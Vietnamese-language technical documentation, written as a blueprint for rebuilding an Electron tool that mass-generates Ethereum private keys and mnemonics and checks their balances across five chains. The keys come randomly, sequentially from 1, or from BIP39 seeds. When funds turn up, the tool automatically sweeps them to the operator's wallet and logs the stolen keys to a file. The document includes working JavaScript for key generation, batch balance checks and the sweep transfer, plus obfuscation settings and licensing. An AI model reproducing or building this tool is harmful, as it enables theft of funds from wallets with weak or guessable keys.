# Blockchain Scanner - System Core Documentation

> File này chứa toàn bộ nghiệp vụ, kiến trúc và logic tương tác FE-BE của hệ thống.
> Mục đích: Dùng làm tài liệu gốc để tái tạo hoặc xây dựng tool tương tự.

---

## 1. TỔNG QUAN HỆ THỐNG

**Mô tả:** Ứng dụng desktop (Electron) quét địa chỉ blockchain đa chuỗi, kiểm tra số dư và tự động chuyển tiền về ví đích.

**Tech Stack:**
- Frontend: Vue 2 + Nuxt 2.17.3 (Electron renderer)
- Backend: Node.js + Express (HTTPS/SPDY trên port 2010)
- Worker: Node.js Cluster (child process)
- Blockchain: Web3.js v4.6
- Build: Webpack + JavaScript Obfuscator

**Kiến trúc:**
```
┌─────────────────────────────────────────────┐
│              Electron App                    │
│  ┌──────────┐      ┌──────────────────────┐ │
│  │ Frontend │ HTTP │      Backend          │ │
│  │ Nuxt/Vue │◄────►│  Express (port 2010)  │ │
│  │ port 1010│      │  ┌──────────────────┐ │ │
│  └──────────┘      │  │  Worker Process  │ │ │
│                    │  │  (Cluster Fork)  │ │ │
│                    │  └──────────────────┘ │ │
│                    └──────────────────────┘ │
└─────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────┐
│  Blockchain RPCs    │
│  ETH/BNB/POLYGON/   │
│  OPTIMISM/ARBITRUM  │
└─────────────────────┘
```

---

## 2. NGHIỆP VỤ CHÍNH

### 2.1 Hệ thống License

**Mục đích:** Kiểm soát quyền sử dụng phần mềm dựa trên machine ID và thời hạn.

**Luồng hoạt động:**
```
1. FE gọi GET /hu0x/_9jjjs → BE trả về UUID máy (machine-digest)
2. User nhập license key (hex-encoded, đã mã hóa RSA)
3. FE gọi POST /hu0x/b00x { license: hexKey }
4. BE giải mã license bằng RSA public key
5. BE xác thực: clientKey, machineUUID, timestamp (chưa hết hạn)
6. BE lấy API keys từ Google Sheets (spreadsheet chứa cấu hình)
7. BE trả về: { b00x: true/false, u3917hhss: nodeUrl, numCPUs: số threads, z10e: configs }
8. FE lưu token vào localStorage, tự động gia hạn mỗi 24h
```

**Chế độ Trial:** FE set `localStorage.isTest = true`, bỏ qua license check, giới hạn tính năng.

**Cấu trúc license sau giải mã:**
```json
{
  "clientKey": "Multichain_Mining",
  "uuid": "<machine-id>",
  "time": "<unix-timestamp-hết-hạn>"
}
```

### 2.2 Quét Blockchain (Core Business)

**Mục đích:** Tạo hàng loạt địa chỉ Ethereum, kiểm tra số dư trên nhiều chain, tự động sweep tiền.

**3 chế độ tạo địa chỉ:**

| Mode | Tên gọi | Cách tạo | Use case |
|------|---------|----------|----------|
| `private` | Random | Random 64-char hex private key → address | Quét ngẫu nhiên |
| `easy` | Sequential | BigInt tuần tự từ startFrom → private key → address | Quét theo dải |
| `seed` | Mnemonic | BIP39 mnemonic (12/24 words) → HD wallet → address | Quét từ seed phrase |

**Luồng quét chính:**
```
1. User cấu hình: số ví, chain, token, mode, số thread, ví đích
2. FE gửi POST /hu0x/08uud/0yyyw với params
3. BE spawn Worker process (cluster.fork)
4. Worker tạo N địa chỉ theo mode đã chọn
5. Worker gọi RunService.run() → kiểm tra balance trên các chain
6. Với mỗi address:
   a. Gọi smart contract balances(addresses[], tokens[]) theo batch (tối đa 10,000/batch)
   b. Nếu tìm thấy balance > 0.00001:
      - Tính gas fee (gasPrice × 21000)
      - Nếu đủ gas: gọi sendCoin() chuyển tiền về ví đích
      - Ghi transaction hash vào HASH.txt
      - Ghi address:privateKey:balance vào coin.txt
7. Worker trả kết quả về parent process → FE
8. FE hiển thị kết quả, lưu localStorage, tiếp tục quét (loop mỗi 1500ms)
```

### 2.3 Multi-Chain Support

**Các blockchain được hỗ trợ:**

| Chain | RPC Endpoints | Batch Size | Token hỗ trợ |
|-------|--------------|------------|---------------|
| ETH (Ethereum) | Infura, DRPC, Ankr | 10,000 | USDT, USDC, BTC |
| BNB (BSC) | Multiple BSC dataseed nodes | 10,000 | USDT, USDC, BTC, ETH |
| Polygon | Infura | 10,000 | USDT, USDC, BTC, ETH |
| Optimism | Infura | 10,000 | USDT, USDC, BTC |
| Arbitrum | Infura | 5,000 | USDT, USDC, BTC |

**Smart Contract ABI dùng để check balance:**
```javascript
// Gọi hàm balances(address[], address[]) trên contract checker
// Input: mảng địa chỉ ví + mảng địa chỉ token
// Output: mảng số dư tương ứng
balances(address[] users, address[] tokens) → uint256[]
```

### 2.4 Chuyển tiền tự động (Fund Sweeping)

**Luồng:**
```
1. Phát hiện address có balance > threshold (0.00001)
2. Tạo Web3 instance kết nối RPC tương ứng
3. addAccount(privateKey) → thêm ví vào wallet
4. getGasPrice() → lấy gas price hiện tại
5. Tính: amount = balance - (gasPrice × 21000)
6. Lần 1: Thử gửi với gas buffer +5%
7. Nếu fail: Thử lại với gas buffer +10%
8. Ghi kết quả vào HASH.txt và coin.txt
```

**File output:**
- `coin.txt`: `address:privateKey:balance` (append mỗi khi tìm thấy)
- `HASH.txt`: `txHash - explorerUrl` (append mỗi khi gửi thành công)

---

## 3. API ENDPOINTS

### 3.1 Danh sách endpoints

| Endpoint | Method | Mô tả | Auth |
|----------|--------|--------|------|
| `/` | GET | Health check, trả `Date.now()` | No |
| `/hu0x/_9jjjs` | GET | Lấy UUID máy | Header validation |
| `/hu0x/b00x` | POST | Xác thực license | Header validation |
| `/hu0x/08uud/0yyy3` | POST | Mở file coin.txt/explorer | Header validation |
| `/hu0x/08uud/0yyyw` | POST | Bắt đầu quét blockchain | Header validation |

### 3.2 Chi tiết request/response

**POST /hu0x/b00x - License Validation**
```javascript
// Request
Headers: { "client-key": "Multichain_Mining", "client-name": "Multichain_Mining" }
Body: { "license": "<hex-encoded-encrypted-license>" }

// Response thành công
{
  "code": 200,
  "message": "success",
  "dataResponse": {
    "b00x": true,
    "u3917hhss": "<infura-api-url>",
    "numCPUs": 4,
    "z10e": "<additional-config>"
  }
}

// Response thất bại
{
  "code": 200,
  "dataResponse": { "b00x": false }
}
```

**POST /hu0x/08uud/0yyyw - Start Scanning**
```javascript
// Request
Body: {
  "obS66g": 3000,        // Số địa chỉ cần tạo mỗi batch
  "_0xs34": "<api-key>",  // Infura API key
  "n002": "private",      // Mode: private | easy | seed
  "k021": ["ETH CHAIN", "BNB CHAIN"],  // Chains
  "l0222": ["USDT", "USDC"],           // Tokens
  "_0djj3": 1,            // Start number (cho mode easy)
  "_6jjjs": "0x...",      // Ví đích nhận tiền
  "obs66g": "<license-id>"
}

// Response
{
  "code": 200,
  "dataResponse": [
    {
      "address": "0x...",
      "privateKey": "0x...",
      "mnemonic": "word1 word2 ...",  // Chỉ có ở mode seed
      "balances": [
        { "chain": "ETH", "token": "USDT", "balance": "0.00" }
      ]
    }
  ]
}
```

### 3.3 Header Validation (Middleware)

Mọi request cần headers:
```javascript
{
  "client-key": "Multichain_Mining",
  "client-name": "Multichain_Mining",
  "Authorization": "<license-token>"  // Cho authenticated routes
}
```

### 3.4 Response Format chuẩn

```javascript
{
  "code": 200 | 400 | 401 | 403 | 404 | 500,
  "message": "string",
  "dataResponse": any
}
```

---

## 4. DATA MODELS

### 4.1 Wallet Address Object
```javascript
{
  address: "0x...",           // Ethereum address
  privateKey: "0x...",        // Private key (hex)
  mnemonic: "word1 word2...", // BIP39 mnemonic (only in seed mode)
  balances: [
    {
      chain: "ETH CHAIN",
      token: "USDT",
      balance: "0.00",
      txHash: "0x..."         // Nếu đã sweep thành công
    }
  ]
}
```

### 4.2 Form Configuration (Frontend State)
```javascript
{
  numOfWallets: 3000,         // Số ví tạo mỗi batch
  nodeUrl: "",                // RPC URL (từ license)
  thread: 1,                  // Số thread song song
  startFrom: 1,               // Số bắt đầu (mode easy)
  listChain: ["BNB CHAIN"],   // Chains đã chọn
  logic: "private",           // Mode quét
  listToken: ["USDT"],        // Tokens cần check
  myAddress: ""               // Ví đích nhận tiền
}
```

### 4.3 Thread Status Object
```javascript
threads: {
  "thread_1": {
    status: "running" | "stopped" | "completed",
    scanned: 15000,           // Tổng số ví đã quét
    found: 2,                 // Số ví có balance
    currentBatch: 5           // Batch hiện tại
  }
}
```

### 4.4 License Data (sau giải mã RSA)
```javascript
{
  clientKey: "Multichain_Mining",
  uuid: "<machine-digest-uuid>",
  time: 1735689600            // Unix timestamp hết hạn
}
```

### 4.5 Account Config (account.json)
```javascript
[{
  "id": "<account-id>",
  "apiKey": "<api-key>",
  "apiSecret": "<api-secret>",
  "runing": true
}]
```

---

## 5. FE-BE INTERACTION FLOWS

### 5.1 Flow khởi động ứng dụng
```
┌──────────┐                    ┌──────────┐
│    FE    │                    │    BE    │
└────┬─────┘                    └────┬─────┘
     │  App load                     │
     │  Check localStorage.token     │
     │                               │
     │  [Không có token]             │
     │──────── Redirect /login ──────│
     │                               │
     │  GET /hu0x/_9jjjs             │
     │──────────────────────────────►│
     │◄──────────────────────────────│
     │  { uuid: "xxx" }             │
     │                               │
     │  [User nhập license]          │
     │  POST /hu0x/b00x             │
     │──────────────────────────────►│
     │         Decrypt RSA           │
     │         Validate license      │
     │         Fetch Google Sheets   │
     │◄──────────────────────────────│
     │  { b00x:true, numCPUs:4,     │
     │    u3917hhss: nodeUrl }       │
     │                               │
     │  Save token, redirect /       │
     │  Set renewal timer (24h)      │
```

### 5.2 Flow quét blockchain
```
┌──────────┐                    ┌──────────┐          ┌──────────┐
│    FE    │                    │    BE    │          │  Worker  │
└────┬─────┘                    └────┬─────┘          └────┬─────┘
     │                               │                     │
     │  POST /hu0x/08uud/0yyyw      │                     │
     │  { numWallets, chains,        │                     │
     │    tokens, mode, target }     │                     │
     │──────────────────────────────►│                     │
     │                               │  cluster.fork()     │
     │                               │────────────────────►│
     │                               │                     │
     │                               │  Generate addresses │
     │                               │  (theo mode)        │
     │                               │                     │
     │                               │  Check balances     │
     │                               │  (multi-chain)      │
     │                               │                     │
     │                               │  [Có balance?]      │
     │                               │  → sendCoin()       │
     │                               │  → Write coin.txt   │
     │                               │  → Write HASH.txt   │
     │                               │                     │
     │                               │◄────────────────────│
     │                               │  Results            │
     │◄──────────────────────────────│                     │
     │  Hiển thị kết quả             │                     │
     │  Lưu localStorage             │                     │
     │                               │                     │
     │  [Wait 1500ms]                │                     │
     │  Gửi batch tiếp theo...       │                     │
```

### 5.3 Flow multi-thread
```
FE quản lý N threads (N = numCPUs từ license):

Thread 1: POST scan → wait response → wait 1500ms → POST scan → ...
Thread 2: POST scan → wait response → wait 1500ms → POST scan → ...
Thread N: POST scan → wait response → wait 1500ms → POST scan → ...

Mỗi thread hoạt động độc lập, FE track status từng thread.
Stop: set isStop = true → tất cả threads dừng sau batch hiện tại.
```

---

## 6. LOGIC CODE QUAN TRỌNG

### 6.1 Tạo địa chỉ - Random Private Key
```javascript
// random.service.js - getListAddress()
function getListAddress(numOfAddress) {
  const list = [];
  for (let i = 0; i < numOfAddress; i++) {
    // Tạo 64 ký tự hex ngẫu nhiên làm private key
    let privateKey = '';
    for (let j = 0; j < 64; j++) {
      privateKey += '0123456789abcdef'[Math.floor(Math.random() * 16)];
    }
    // Chuyển private key → Ethereum address
    const address = privateKeyToAddress('0x' + privateKey);
    list.push({ address, privateKey, balances: [] });
  }
  return list;
}
```

### 6.2 Tạo địa chỉ - Sequential (BigInt)
```javascript
// random.service.js - getListAddress2()
function getListAddress2(numOfAddress, start) {
  const list = [];
  let startBigInt = BigInt(start || 1);
  for (let i = 0; i < numOfAddress; i++) {
    // Chuyển số tuần tự thành hex 64 ký tự
    let privateKey = startBigInt.toString(16).padStart(64, '0');
    const address = privateKeyToAddress('0x' + privateKey);
    list.push({ address, privateKey, balances: [] });
    startBigInt++;
  }
  return list;
}
```

### 6.3 Tạo địa chỉ - Mnemonic (BIP39)
```javascript
// random.service.js - randomMnemonic()
async function randomMnemonic(numberOfAccounts, type = 12) {
  const list = [];
  for (let i = 0; i < numberOfAccounts; i++) {
    // Tạo entropy → mnemonic 12 hoặc 24 từ
    const entropy = type === 12 ? 128 : 256; // bits
    const mnemonic = bip39.generateMnemonic(wordlist, entropy);

    // Dùng MetaMask HD Keyring để derive address
    const keyring = new HdKeyring({ mnemonic, numberOfAccounts: 1 });
    const accounts = await keyring.getAccounts();
    const address = accounts[0];

    list.push({ address, privateKey: '', mnemonic, balances: [] });
  }
  return list;
}
```

### 6.4 Kiểm tra balance multi-chain
```javascript
// run.service.js - check()
async function check(web3, contractAddress, addresses, tokens, chain, targetAddress) {
  // Tạo contract instance từ ABI
  const contract = new web3.eth.Contract(ABI, contractAddress);

  // Gọi hàm balances() trên smart contract
  // Input: mảng address[], mảng token address[]
  // Token address = '0x0000...0000' cho native coin (ETH/BNB/MATIC)
  const result = await contract.methods
    .balances(addressArray, tokenAddressArray)
    .call();

  // result là mảng flat: [addr1_token1, addr1_token2, addr2_token1, addr2_token2, ...]
  // Parse kết quả theo matrix addresses × tokens
  for (let i = 0; i < addresses.length; i++) {
    for (let j = 0; j < tokens.length; j++) {
      const balance = result[i * tokens.length + j];
      if (balance > threshold) {
        // Tìm thấy tiền → cố gắng sweep
        await sendCoin(web3, addresses[i].privateKey, targetAddress, balance);
        // Ghi vào file
        appendToFile('coin.txt', `${address}:${privateKey}:${balance}`);
      }
    }
  }
}
```

### 6.5 Gửi tiền (Fund Sweep)
```javascript
// sendCoin/Manager.js
class Manager {
  async send(fromPrivateKey, toAddress) {
    this.addAccount(fromPrivateKey);
    const balance = await this.getBalance(fromAddress);
    const gasPrice = await this.getGasPrice();

    // Gas fee = gasPrice × 21000 (standard transfer)
    const gasFee = gasPrice * 21000n;
    const amount = balance - gasFee;

    if (amount <= 0) return null; // Không đủ gas

    // Lần 1: thử với gas price + 5%
    try {
      return await this.createTx(fromAddress, toAddress, amount, gasPrice * 105n / 100n);
    } catch {
      // Lần 2: thử với gas price + 10%
      return await this.createTx(fromAddress, toAddress, amount, gasPrice * 110n / 100n);
    }
  }
}
```

### 6.6 Worker Process
```javascript
// worker/index.js
process.on('message', async (msg) => {
  const { obS66g, _0xs34, n002, k021, l0222, _0djj3, _6jjjs } = msg;

  // Tạo địa chỉ theo mode
  let addresses;
  switch (n002) {
    case 'easy':
      addresses = RandomService.getListAddress2(obS66g, _0djj3);
      break;
    case 'private':
      addresses = RandomService.getListAddress(obS66g);
      break;
    case 'seed':
      addresses = await RandomService.randomMnemonic(obS66g);
      break;
  }

  // Kiểm tra balance trên các chain đã chọn
  const results = await RunService.run(_0xs34, addresses, l0222, k021, _6jjjs);

  // Trả kết quả về parent process
  process.send({ type: 'result', data: results });
  setTimeout(() => process.exit(0), 500);
});
```

### 6.7 FE - Thread Management & Scanning Loop
```javascript
// pages/index.vue - check() method (simplified)
async check(threadId) {
  while (!this.isStop) {
    const params = {
      obS66g: this.form.numOfWallets,
      _0xs34: this.form.nodeUrl,
      n002: this.form.logic,
      k021: this.form.listChain,
      l0222: this.form.listToken,
      _0djj3: this.form.startFrom,
      _6jjjs: this.form.myAddress
    };

    const response = await this.$WalletApi._0x333d(params);
    const wallets = response.dataResponse;

    // Cập nhật danh sách ví đã quét
    this.dataTable.data.push(...wallets);

    // Lọc ví có balance > 0
    const withBalance = wallets.filter(w =>
      w.balances.some(b => parseFloat(b.balance) > 0)
    );
    this.dataTable2.data.push(...withBalance);

    // Lưu vào localStorage
    localStorage.setItem('dataTable', JSON.stringify(this.dataTable.data));
    localStorage.setItem('dataTable2', JSON.stringify(this.dataTable2.data));

    // Cập nhật startFrom cho mode easy
    if (this.form.logic === 'easy') {
      this.form.startFrom += this.form.numOfWallets;
      localStorage.setItem('start', this.form.startFrom);
    }

    // Đợi 1500ms trước batch tiếp theo
    await new Promise(resolve => setTimeout(resolve, 1500));
  }
}
```

### 6.8 FE - License Activation
```javascript
// pages/index.vue - activateLicense()
async activateLicense() {
  const token = localStorage.getItem('token');
  const res = await this.$AuthApi._0x3342({ license: token });

  if (res.dataResponse?.b00x) {
    this.form.nodeUrl = res.dataResponse.u3917hhss;
    this.maxThread = res.dataResponse.numCPUs;
    // Tự động gia hạn mỗi 24h
    setInterval(() => this.activateLicense(), 24 * 60 * 60 * 1000);
  } else {
    // License không hợp lệ → logout
    localStorage.removeItem('token');
    this.$router.push('/login');
  }
}
```

---

## 7. MIDDLEWARE & SECURITY

### 7.1 Request Validation
```javascript
// middlewares/validate.js
checkValidRequest(req, res, next) {
  const clientKey = req.headers['client-key'];
  const clientName = req.headers['client-name'];
  if (clientKey !== 'Multichain_Mining' || clientName !== 'Multichain_Mining') {
    return res.forbidden('Invalid client');
  }
  next();
}
```

### 7.2 JWT Authentication
```javascript
// middlewares/authJwt.js
verifyToken(req, res, next) {
  const token = req.headers.authorization;
  jwt.verify(token, SECRET, (err, decoded) => {
    if (err) return res.unauthorized();
    req.user = decoded;
    next();
  });
}
```

### 7.3 FE Auth Middleware
```javascript
// middleware/auth.js
export default function({ route, redirect }) {
  if (route.path === '/login') return;
  const token = localStorage.getItem('token');
  if (!token && route.meta?.auth) {
    return redirect('/login');
  }
}
```

### 7.4 Axios Interceptors (FE)
```javascript
// plugins/axios.js
axios.interceptors.request.use(config => {
  config.headers['Authorization'] = localStorage.getItem('token');
  config.headers['client-key'] = 'Multichain_Mining';
  config.headers['client-name'] = 'Multichain_Mining';
  return config;
});

axios.interceptors.response.use(null, error => {
  if (error.response?.status === 401) {
    router.push('/login');
  }
  return Promise.reject(error);
});
```

---

## 8. TOKEN CONTRACT ADDRESSES

### Địa chỉ contract token trên mỗi chain:

**ETH Chain:**
- USDT: `0xdAC17F958D2ee523a2206206994597C13D831ec7`
- USDC: `0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48`
- BTC (WBTC): `0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599`
- Native ETH: `0x0000000000000000000000000000000000000000`

**BNB Chain:**
- USDT: `0x55d398326f99059fF775485246999027B3197955`
- USDC: `0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d`
- BTC: `0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c`
- ETH: `0x2170Ed0880ac9A755fd29B2688956BD959F933F8`

**Polygon Chain:**
- USDT: `0xc2132D05D31c914a87C6611C10748AEb04B58e8F`
- USDC: `0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174`
- BTC: `0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6`
- ETH: `0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619`

**Optimism Chain:**
- USDT: `0x94b008aA00579c1307B0EF2c499aD98a8ce58e58`
- USDC: `0x7F5c764cBc14f9669B88837ca1490cCa17c31607`
- BTC: `0x68f180fcCe6836688e9084f035309E29Bf0A2095`

**Arbitrum Chain:**
- USDT: `0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9`
- USDC: `0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8`
- BTC: `0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f`

---

## 9. RPC ENDPOINTS

```javascript
const RPC_URLS = {
  ETH: [
    'https://mainnet.infura.io/v3/{API_KEY}',
    'https://eth.drpc.org',
    'https://rpc.ankr.com/eth'
  ],
  BNB: [
    'https://bsc-dataseed.binance.org',
    'https://bsc-dataseed1.defibit.io',
    'https://bsc-dataseed1.ninicoin.io',
    'https://bsc-dataseed2.defibit.io'
  ],
  POLYGON: ['https://polygon-mainnet.infura.io/v3/{API_KEY}'],
  OPTIMISM: ['https://optimism-mainnet.infura.io/v3/{API_KEY}'],
  ARBITRUM: ['https://arbitrum-mainnet.infura.io/v3/{API_KEY}']
};
```

---

## 10. FILE I/O

| File | Mục đích | Format |
|------|----------|--------|
| `coin.txt` | Lưu ví có balance | `address:privateKey:balance` (append) |
| `HASH.txt` | Lưu transaction hash | `txHash - explorerURL` (append) |
| `account.json` | Cấu hình API account | JSON array |
| `cert/server.key` | SSL private key | PEM |
| `cert/server.cert` | SSL certificate | PEM |

---

## 11. BUILD & OBFUSCATION

**Webpack config cho production:**
```javascript
// webpack.config.js
entry: {
  'index': './server.js',       // → dist/temp/index.js
  'a': './worker/index.js'      // → dist/temp/a.js (worker obfuscated)
}

// JavaScript Obfuscator options:
{
  rotateStringArray: true,
  stringArray: true,
  stringArrayEncoding: ['base64'],
  deadCodeInjection: true,
  selfDefending: true,
  identifierNamesGenerator: 'mangled-shuffled'
}
```

---

## 12. CONFIGURATION CONSTANTS

```javascript
// Global config
const CONFIG = {
  version: '1.0',
  port: 2010,
  clientKey: 'Multichain_Mining',
  clientName: 'Multichain_Mining',
  baseUrl: 'localhost',
  fePort: 1010,
  apiTimeout: 600000  // 10 minutes
};

// Scanning defaults
const SCAN_DEFAULTS = {
  numOfWallets: 3000,     // Ví per batch
  defaultChain: 'BNB CHAIN',
  defaultToken: 'USDT',
  defaultMode: 'private',
  batchDelay: 1500,       // ms giữa các batch
  maxBatchSize: 10000,    // Addresses per RPC call
  arbBatchSize: 5000,     // Arbitrum smaller batch
  balanceThreshold: 0.00001,
  gasLimit: 21000
};
```

---

## 13. LOCALIZATION

Hỗ trợ 2 ngôn ngữ: Vietnamese (mặc định) và English.
Chuyển đổi qua `$i18n.setLocale(code)`.

Key translations chính:
- `sidebar.scanner` - Menu quét
- `form.numWallets` - Số ví
- `form.thread` - Số luồng
- `form.startFrom` - Bắt đầu từ
- `form.myAddress` - Ví nhận
- `form.chains` - Chuỗi blockchain
- `form.tokens` - Token
- `form.mode` - Chế độ quét
- `button.start` - Bắt đầu
- `button.stop` - Dừng
- `table.address` - Địa chỉ
- `table.balance` - Số dư
- `table.privateKey` - Khóa riêng

---

## 14. DEPENDENCIES CHÍNH

**Backend:**
```
express, web3@^4.6.0, @metamask/eth-hd-keyring, @scure/bip39,
ethereum-private-key-to-address, cors, spdy, ws, machine-digest,
public-google-sheets-parser, randomstring, jsonwebtoken
```

**Frontend:**
```
nuxt@2.17.3, vue@2, axios@0.27, element-ui@2.15, moment,
vue-clipboard2, @nuxtjs/i18n@7, sass
```

---

## 15. TÓM TẮT KIẾN TRÚC HỆ THỐNG

```
USER → [Electron App]
         │
         ├── Frontend (Nuxt/Vue, port 1010)
         │     ├── Login Page: UUID + License validation
         │     ├── Dashboard: Config scanning params
         │     ├── Thread Manager: Parallel scanning loops
         │     ├── Results Display: DataTable + DataTable2 (có balance)
         │     └── LocalStorage: Persist state across sessions
         │
         ├── Backend (Express/HTTPS, port 2010)
         │     ├── License Controller: RSA decrypt + Google Sheets verify
         │     ├── App Controller: Spawn worker for scanning
         │     ├── Worker Process: Generate addresses + Check balances
         │     ├── Run Service: Multi-chain RPC calls via smart contract
         │     ├── SendCoin Service: Auto-sweep funds to target wallet
         │     └── File I/O: coin.txt + HASH.txt
         │
         └── External Services
               ├── Blockchain RPCs (Infura, Ankr, BSC nodes)
               ├── Google Sheets (License database)
               └── Smart Contracts (Balance checker on each chain)
```
